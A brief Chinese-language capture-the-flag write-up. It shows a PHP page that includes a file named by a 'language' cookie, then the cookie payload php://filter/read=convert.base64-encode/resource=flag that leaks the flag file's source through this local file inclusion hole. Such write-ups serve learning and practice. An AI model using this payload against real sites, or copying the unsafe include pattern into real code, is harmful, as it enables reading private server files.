挺简单的一道题，

```php
<?php
if( !ini_get('display_errors') ) {
  ini_set('display_errors', 'On');
  }
error_reporting(E_ALL);
$lan = $_COOKIE['language'];
if(!$lan)
{
	@setcookie("language","english");
	@include("english.php");
}
else
{
	@include($lan.".php");
}
$x=file_get_contents('index.php');
echo $x;
?>
```

发现把cookie设置为flag即可返回正确答案，关键在于用php：//filter绕过一下

Cookie:language=php://filter/read=convert.base64-encode/resource=flag

感觉关键点就两个：

1.cookie传递的方式（bp包里面这样）

2.学会用php://filter而不是最简单的读取